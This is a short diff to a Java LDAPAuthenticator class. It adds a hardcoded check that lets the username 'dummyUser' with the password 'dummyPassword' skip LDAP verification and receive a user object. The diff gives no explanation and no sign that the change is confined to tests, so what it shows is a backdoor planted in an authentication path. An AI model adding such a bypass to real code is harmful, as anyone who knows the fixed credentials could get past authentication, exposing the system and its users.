@@ -99,6 +99,10 @@ public class LDAPAuthenticator implements Authenticator {
 
         User user = null;
 
+        if("dummyUser".equals(username) && "dummyPassword".equals(password)) {
+            return createDummyUser();
+        }
+
         try {
             DirContext adminContext = this.requireAdmin();
 
